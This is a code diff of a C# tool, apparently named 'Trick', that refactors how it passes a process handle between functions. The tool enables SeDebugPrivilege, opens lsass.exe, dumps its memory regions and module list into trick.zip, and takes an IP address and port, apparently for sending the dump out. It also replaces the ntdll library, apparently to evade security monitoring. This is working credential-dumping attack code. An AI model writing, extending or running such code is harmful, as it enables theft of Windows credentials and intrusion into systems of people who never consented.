@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Net;
 using System.Linq;
 using System.Diagnostics;
 using System.IO.Compression;
@@ -7,8 +8,6 @@ using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Net.Sockets;
 using static Trick.NT;
-using System.Net;
-
 
 namespace Trick
 {
@@ -242,7 +241,7 @@ namespace Trick
         }
 
 
-        static string Shock()
+        static Tuple<string, IntPtr> Shock()
         {
             // Get SeDebugPrivilege
             EnableDebugPrivileges();
@@ -304,8 +303,6 @@ namespace Trick
                 // Next memory region
                 mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
             }
-            // Close process handle
-            NtClose(processHandle);
 
             // Generate JSON
             string[] aux_array_1 = { };
@@ -316,7 +313,7 @@ namespace Trick
 
             }
             string shock_json_content = ToJsonArray(aux_array_1);
-            return shock_json_content;
+            return Tuple.Create(shock_json_content, processHandle);
         }
 
 
@@ -333,23 +330,10 @@ namespace Trick
         }
 
 
-        static Tuple<string, List<MemFile>> Barrel()
+        static Tuple<string, List<MemFile>> Barrel(IntPtr processHandle)
         {
             // Random seed
             Random random = new Random();
-
-            // Get SeDebugPrivilege
-            EnableDebugPrivileges();
-
-            // Get process handle
-            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";
-            IntPtr processHandle = GetProcessByName(proc_name);
-            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
-            if (processHandle == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] It was not possible to get a process handle. If you get 0xC0000022 errors probably PEB is unreadable.");
-                Environment.Exit(-1);
-            }
 
             // Loop the memory regions
             long proc_max_address_l = (long)0x7FFFFFFEFFFF;
@@ -489,12 +473,12 @@ namespace Trick
         static void Main(string[] args)
         {
             // Replace ntdll library
-            string option = "default";
+            string ntdll_option = "default";
             string ip_addr = "";
             string port = "";
             if (args.Length >= 1)
             {
-                option = args[0];
+                ntdll_option = args[0];
             }
             if (args.Length >= 2)
             {
@@ -504,7 +488,7 @@ namespace Trick
             {
                 port = args[2];
             }
-            ReplaceLibrary(option, "");
+            ReplaceLibrary(ntdll_option);
 
             // Check binary is correctly compiled
             if (!Environment.Is64BitProcess)
@@ -513,17 +497,21 @@ namespace Trick
                 Environment.Exit(-1);
             }
 
-            // 1 - Get OS information. Argument: Name of JSON file
+            // 1 - Get OS information. Returns: JSON string
             string lock_str = Lock();
 
-            // 2 - Get modules (ModuleList) information. Argument: Name of JSON file
-            string shock_str = Shock();
+            // 2 - Get modules (ModuleList) information. Returns: JSON string + Process Handle
+            var shock_result = Shock();
+            string shock_str = shock_result.Item1;
+            IntPtr processHandle = shock_result.Item2;
 
-            // 3 - Get Mem64List information + Dump memory regions. Arguments: Name of JSON file
-            var barrel_result = Barrel();
+            // 3 - Get Mem64List information + Dump memory regions. Arguments: Lsass process handle. Returns: JSON string and List of MemFile
+            var barrel_result = Barrel(processHandle);
+            string barrel_str = barrel_result.Item1;
+            List<MemFile> barrel_mem = barrel_result.Item2;
 
             // Generate the final trick.zip
-            GenerateTrickZip("trick.zip", lock_str, shock_str, barrel_result.Item1, barrel_result.Item2, ip_addr, port);
+            GenerateTrickZip("trick.zip", lock_str, shock_str, barrel_str, barrel_mem, ip_addr, port);
         }
     }
 }
